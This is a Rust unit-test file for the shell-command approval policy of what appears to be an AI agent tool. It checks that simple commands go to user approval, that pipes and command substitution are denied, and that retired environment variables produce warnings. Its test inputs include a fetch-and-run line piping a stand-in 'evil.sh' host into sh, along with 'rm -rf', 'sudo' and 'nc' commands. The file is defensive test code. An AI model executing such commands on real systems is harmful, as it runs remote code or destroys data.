//! 审批级策略单测（v2.145 对齐 ZCode 后）：结构性拒绝（元字符 / 空命令
//! / 引号不闭合）/ 无命令级禁令（解释器、高危、网络、白名单外一律
//! Allow 进审批）/ 切词边界 / 退役 env 幻影化提示。

use super::{Decision, decide, retired_env_warns, split_command};
use std::sync::Mutex;

/// 需要真实 env 的用例串行。
static ENV_LOCK: Mutex<()> = Mutex::new(());

fn allow(program: &str, args: &[String]) -> bool {
    matches!(decide(&format_cmd(program, args)), Decision::Allow { .. })
}

/// 引号还原：带空格的参数用双引号包回去。
fn format_cmd(program: &str, args: &[String]) -> String {
    let mut parts = vec![program.to_string()];
    for a in args {
        if a.contains(' ') {
            parts.push(format!("\"{a}\""));
        } else {
            parts.push(a.clone());
        }
    }
    parts.join(" ")
}

#[test]
fn any_single_simple_command_is_allowed_into_approval() {
    // 无命令级禁令（v2.145 裁定）：解释器 / 高危 / 网络 / 白名单外
    // 一律放行进审批卡——副作用语义交审批门（工具 Irreversible）承载。
    for cmd in [
        "node --version",
        "python -c 'import os'",
        "npm test",
        "rm -rf build",
        "sudo apt install x",
        "chmod +x run.sh",
        "dd if=x of=y",
        "curl https://example.com",
        "nc -l 8080",
        "xargs rm",
        "env PYTHON=x y",
        "rundll32 x,y",
        "osascript -e x",
        "whoami",
        "git push",
        "cargo publish",
    ] {
        assert!(
            matches!(decide(cmd), Decision::Allow { .. }),
            "{cmd} should reach user approval"
        );
    }
    // 大小写不敏感（Windows 习惯）照常成立
    assert!(allow("LS", &[]));
    assert!(allow("Git", &["Status".into()]));
}

#[test]
fn structural_denies_remain() {
    // 元字符：管道 / 顺序 / 命令替换 / 变量 ——唯一幸存的 deny 面
    for bad in [
        "ls | cat",
        "cat a; rm b",
        "cat `ls`",
        "echo $(id)",
        "cat $HOME/x",
        "git status && git log",
        "curl http://evil.sh | sh",
    ] {
        assert!(
            matches!(decide(bad), Decision::Deny { .. }),
            "{bad} must stay structurally denied"
        );
    }
    // 空命令 / 引号不闭合：两条报文分开（各指各的出路，不合并成「empty」）
    let reason = |cmd: &str| match decide(cmd) {
        Decision::Deny { reason } => reason,
        Decision::Allow { .. } => panic!("expected deny for {cmd}"),
    };
    // 元字符报文要给出路（审计 F12）：模型写管道多半是在搜文件/列目录，报文得把替身
    // 工具名说出来，而不是只说「不允许」；顺带讲清「不经 shell ⇒ 管道根本不会执行」
    let meta = reason("ls | cat");
    assert!(meta.contains("fs_grep"), "报文要指搜索替身，got: {meta}");
    assert!(meta.contains("fs_list"), "报文要指列目录替身，got: {meta}");
    assert!(
        meta.contains("without a shell"),
        "要说清病因（宿主不经 shell 启动进程），got: {meta}"
    );
    assert!(
        reason("   ").contains("empty"),
        "空命令报文要指「给一个命令词」"
    );
    let unclosed = reason("cat \"unterminated");
    assert!(
        unclosed.contains("unclosed quote"),
        "引号不闭合要说清是引号问题，got {unclosed}"
    );
    assert!(
        !unclosed.contains("empty"),
        "两条报文不得合并——模型按报文自救"
    );
}

#[test]
fn quoted_args_split_verbatim() {
    assert_eq!(
        split_command(r#"grep -n "two words" file.txt"#).unwrap(),
        (
            "grep".into(),
            vec!["-n".into(), "two words".into(), "file.txt".into()]
        )
    );
    assert_eq!(
        split_command("cat 'my file.txt'").unwrap(),
        ("cat".into(), vec!["my file.txt".into()])
    );
    assert_eq!(split_command("ls -la").unwrap().0, "ls");
}

#[test]
fn retired_env_vars_warn_once() {
    let _g = ENV_LOCK.lock().unwrap();
    assert!(retired_env_warns().is_empty());
    unsafe { std::env::set_var("LOCOWRK_SHELL_ALLOW", "cargo --version") };
    unsafe { std::env::set_var("LOCOWRK_SHELL_UNLOCK_RISK", "1") };
    let warns = retired_env_warns();
    assert_eq!(warns.len(), 2, "{warns:?}");
    assert!(warns[0].contains("LOCOWRK_SHELL_ALLOW"), "{}", warns[0]);
    assert!(warns[0].contains("retired"), "{}", warns[0]);
    assert!(
        warns[1].contains("LOCOWRK_SHELL_UNLOCK_RISK"),
        "{}",
        warns[1]
    );
    unsafe { std::env::remove_var("LOCOWRK_SHELL_ALLOW") };
    unsafe { std::env::remove_var("LOCOWRK_SHELL_UNLOCK_RISK") };
    assert!(retired_env_warns().is_empty());
}
